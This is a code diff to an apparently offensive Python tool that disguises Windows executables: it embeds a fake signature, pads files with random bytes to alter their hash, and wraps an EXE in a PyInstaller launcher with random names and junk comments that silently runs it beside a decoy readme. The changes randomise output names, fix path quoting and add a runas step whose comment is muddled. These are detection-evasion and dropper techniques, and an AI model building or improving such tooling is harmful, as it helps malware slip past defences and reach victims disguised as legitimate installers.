@@ -111,7 +111,7 @@ def embed_fake_signature(file_path, temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
             set_file_permissions(temp_dir)
         
-        signed_path = os.path.join(temp_dir, os.path.basename(file_path))
+        signed_path = os.path.join(temp_dir, f"signed_{generate_random_string()}.exe")
         shutil.copyfile(file_path, signed_path)
         set_file_permissions(signed_path)
         if not check_file_access(signed_path):
@@ -172,7 +172,7 @@ def pad_file(file_path, temp_dir):
     """Append random bytes to the file to alter its hash."""
     print(Fore.GREEN + f"[+] Padding {file_path} with random bytes..." + Style.RESET_ALL)
     try:
-        padded_path = os.path.join(temp_dir, os.path.basename(file_path))
+        padded_path = os.path.join(temp_dir, f"padded_{generate_random_string()}.exe")
         shutil.copyfile(file_path, padded_path)
         set_file_permissions(padded_path)
         if not check_file_access(padded_path):
@@ -273,6 +273,7 @@ def create_exe_wrapper(exe_path, output_dir, original_filename, temp_dir):
         
         # Create temporary Python script for pyinstaller
         product_name, _ = generate_random_name()
+        product_name = product_name.replace(" ", "_")  # Avoid spaces in pyinstaller name
         with open(temp_script_path, "w") as f:
             f.write(f"""
 # Random comment {generate_random_string()}
@@ -282,11 +283,11 @@ import shutil
 # Random comment {generate_random_string()}
 
 def run_installer():
-    exe_path = os.path.join(os.path.dirname(__file__), "{os.path.basename(exe_path)}")
+    exe_path = os.path.join(os.path.dirname(__file__), r"{os.path.basename(exe_path)}")
     dummy_path = os.path.join(os.path.dirname(__file__), "readme.txt")
     try:
-        shutil.copyfile("{exe_path}", exe_path)
-        shutil.copyfile("{dummy_file}", dummy_path)
+        shutil.copyfile(r"{exe_path}", exe_path)
+        shutil.copyfile(r"{dummy_file}", dummy_path)
         subprocess.run([exe_path], check=True)
     except Exception as e:
         print(f"Installation failed: {{e}}")
@@ -300,7 +301,7 @@ if __name__ == "__main__":
             print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
             return exe_path
         
-        # Run pyinstaller to create EXE
+        # Run pyinstaller in non-admin context
         cmd = [
             "pyinstaller",
             "--onefile",
@@ -311,7 +312,16 @@ if __name__ == "__main__":
             temp_script_path
         ]
         print(Fore.GREEN + f"[+] Executing pyinstaller command: {' '.join(cmd)}" + Style.RESET_ALL)
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=300)
+        
+        # Run as non-admin using runas (assumes 'Admin' user has non-admin privileges available)
+        try:
+            # Use a non-admin command prompt to run pyinstaller
+            non_admin_cmd = ["runas", "/user:Admin", f"cmd.exe /c {' '.join(cmd)}"]
+            result = subprocess.run(non_admin_cmd, capture_output=True, text=True, check=True, timeout=300)
+        except subprocess.CalledProcessError as e:
+            print(Fore.RED + f"[+] Error running pyinstaller as non-admin: {e.stderr} (Exit code: {e.returncode})" + Style.RESET_ALL)
+            print(Fore.GREEN + "[+] Attempting to run pyinstaller with current privileges..." + Style.RESET_ALL)
+            result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=300)
         
         # Locate the generated EXE
         generated_exe = os.path.join(temp_dir, "dist", product_name + ".exe")
